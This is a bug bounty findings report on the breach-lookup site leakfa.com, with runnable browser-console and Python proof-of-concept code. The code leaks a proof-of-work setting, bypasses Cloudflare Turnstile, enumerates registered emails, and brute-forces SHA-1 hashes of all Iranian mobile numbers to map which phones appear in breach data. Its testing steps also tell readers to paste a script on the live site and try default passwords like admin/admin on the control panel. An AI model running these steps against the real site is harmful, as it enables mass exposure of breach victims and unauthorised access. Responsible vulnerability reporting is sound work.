# Leakfa.com - Bug Bounty Findings Report

## Summary

Source code is publicly available at: https://github.com/Leakfarsi/Leakfa.com

---

## Finding 1: PoW Oracle - Internal Configuration Leak (LOW/INFO)

**File:** `/api/search.php`  
**Endpoint:** `POST /api/search.php`

**Description:**  
When using `mode=pow` with an invalid nonce, the error message reveals the internal `POW_DIFF` constant:

```php
$res['error'] = 'Nonce error: Nonce must meet the sha1 (request hash + nonce)' . POW_DIFF . ' Bit equal ' . str_repeat('a', POW_DIFF);
```

**Proof of Concept (run in browser console on leakfa.com):**
```javascript
const r = await fetch('/api/search.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'hash=da39a3ee5e6b4b0d3255bfef95601890afd80709&mode=pow&nonce=X'
});
console.log(await r.json());
// Expected: {"status":"1","error":"Nonce error: Nonce must meet the sha1 (request hash + nonce)3 Bit equal aaa"}
// ^ This reveals POW_DIFF = 3
```

**Impact:** Attacker learns exact difficulty to automate PoW solving.

---

## Finding 2: Turnstile Bypass via PoW Mode (MEDIUM)

**File:** `/api/search.php`  
**Endpoint:** `POST /api/search.php`

**Description:**  
The search API supports two anti-bot modes: `turnstile` and `pow`. The PoW mode allows completely bypassing Cloudflare Turnstile. With a known `POW_DIFF` (from Finding 1), an attacker can automate thousands of searches without solving a Turnstile challenge.

```php
} elseif($mode == 'pow'){
    if (substr(sha1($hash . $nonce), 0, POW_DIFF) != str_repeat('a', POW_DIFF)){
        // PoW failed
    }
}
```

**Proof of Concept:**
```javascript
// SHA-1 in browser
async function sha1(str) {
    const buf = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(str));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
}

// Solve PoW with difficulty=3 (prefix 'aaa')
async function solvePow(hash, diff) {
    const prefix = 'a'.repeat(diff);
    for (let n = 0; ; n++) {
        const h = await sha1(hash + n.toString());
        if (h.startsWith(prefix)) return n.toString();
    }
}

// Search without Turnstile
const targetHash = await sha1('09123456789');  // victim phone
const nonce = await solvePow(targetHash, 3);   // ~4096 tries on average
const r = await fetch('/api/search.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `hash=${targetHash}&mode=pow&nonce=${nonce}`
});
console.log(await r.json());
```

**Impact:**  
- Automated bulk searching without Turnstile
- Combined with phone brute force (Finding 5): enumerate ALL registered phone numbers

---

## Finding 3: User Enumeration via /api/subscription_status.php (MEDIUM)

**File:** `/api/subscription_status.php` → `get_subscription_status()` in `common.php`  
**Endpoint:** `POST /api/subscription_status.php`

**Description:**  
The endpoint returns different responses based on whether an email exists in the database:

```php
function get_subscription_status($email){
    if (is_account_exist($email)){
        if (is_account_verify($email)){
            $res['result'] = 'subscribed';        // Email IS registered & verified
        }else{
            $res['result'] = 'verification_pending'; // Email IS registered, not verified
        }
    }else{
        $res['result'] = 'not_subscribed';         // Email NOT in database
    }
}
```

**Proof of Concept:**
```javascript
// Need valid Turnstile token first - use one from the notify.php page
const r = await fetch('/api/subscription_status.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `email=victim@example.com&token=<TURNSTILE_TOKEN>`
});
const data = await r.json();
// data.result = 'subscribed'          → email IS in database + verified
// data.result = 'verification_pending' → email IS in database
// data.result = 'not_subscribed'       → email NOT in database
console.log(data);
```

**Impact:**  
- Enumerate whether specific email addresses are registered in the breach notification system
- Privacy concern: reveals which users are monitoring their breach status

---

## Finding 4: User Enumeration via /api/subscribe.php (MEDIUM)

**File:** `/api/subscribe.php` → `subscribe()` in `common.php`  
**Endpoint:** `POST /api/subscribe.php`

**Description:**  
When subscribing with an existing email, different error messages reveal the subscription state:

```php
if (is_account_exist($email)){              // email exists
    if (is_account_verify($email)){          // AND is verified
        $account = get_account($email, $hash);
        if($account['name']){               // AND hash matches
            $res['error'] = 'این ایمیل در باخبرم کن قبلا ثبت شده است، یک نامه آزمایشی...';
        }else{
            $res['error'] = 'شماره وارد شده با داده های اصلی مطابقت ندارد';
            // *** EMAIL IS REGISTERED + VERIFIED but phone doesn't match ***
        }
    }else{
        $res['error'] = 'این آدرس ایمیل در سامانه باخبرم کن ثبت شده اما هنوز تایید نشده';
        // *** EMAIL IS REGISTERED but not verified ***
    }
}
```

**Impact:**  
- Same as Finding 3 but also confirms if phone/email combination is linked

---

## Finding 5: SHA-1 Phone Number Brute Force (MEDIUM)

**Description:**  
The site hashes phone numbers with SHA-1 before sending them to the server. Iranian phone numbers have format `09XX-XXX-XXXX` = ~100 million combinations. With the PoW bypass (Finding 2), an attacker can:

1. Pre-generate all ~100M SHA-1 hashes of Iranian phone numbers
2. Query each one via the API (bypassing Turnstile with PoW)
3. Build a complete database of which phone numbers are in breach data

**Code:**
```python
import hashlib, itertools

# Generate all Iranian mobile numbers
for prefix in ['0910','0911','0912','0913','0914','0915','0916','0917','0918','0919',
                '0930','0931','0932','0933','0935','0936','0937','0938','0939',
                '0941','0990','0991','0992','0993','0994']:
    for suffix in range(10000000):
        phone = f"{prefix}{suffix:07d}"
        h = hashlib.sha1(phone.encode()).hexdigest()
        # Query: POST /api/search.php with hash=h&mode=pow&nonce=<solved>
```

**Impact:**  
- Full enumeration of all compromised phone numbers in the database
- Mass privacy breach

---

## Finding 6: IP Spoofing via CF-Connecting-IP Header (LOW)

**File:** `src/common.php`

**Description:**  
The `get_ip()` function trusts the `CF-Connecting-IP` header without validation:

```php
function get_ip(){
    return $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
}
```

This header is normally set by Cloudflare, but if an attacker can reach the origin server directly (e.g., through IP discovery), they can spoof any IP address, bypassing IP-based rate limiting.

**Impact:**  
- IP-based rate limiting bypass (in `search_log` table)
- Fake IP in subscriber records (`sub_ip` field)

---

## Subdomains Discovered

| Subdomain | Status | Notes |
|-----------|--------|-------|
| `leakfa.com` | 403 CF | Main site |
| `www.leakfa.com` | 403 CF | WWW redirect |
| `cp.leakfa.com` | 403 CF | **Control Panel** - high value target |
| `go.leakfa.com` | 302 | Redirect service |
| `status.leakfa.com` | Down | Status page |

**`cp.leakfa.com` - Control Panel** should be manually investigated as it may have separate auth controls.

---

## Testing Instructions

**Step 1:** Open https://leakfa.com in your browser and wait for CF challenge to pass.

**Step 2:** Open DevTools (F12) → Console

**Step 3:** Run `leakfa_test.js` script by pasting it in console

**Step 4:** Test `cp.leakfa.com` manually - try:
- Default credentials (admin/admin, admin/password)
- Common admin paths: `/wp-admin`, `/admin`, `/login`, `/dashboard`
- Check if it has different CF settings

---

## CVSS Estimates

| Finding | Severity | CVSS |
|---------|----------|------|
| PoW Oracle | INFO | 3.1 |
| Turnstile Bypass via PoW | MEDIUM | 5.3 |
| User Enumeration (status) | MEDIUM | 5.3 |
| User Enumeration (subscribe) | MEDIUM | 4.3 |
| Phone Brute Force | MEDIUM | 5.3 |
| IP Spoofing | LOW | 3.7 |
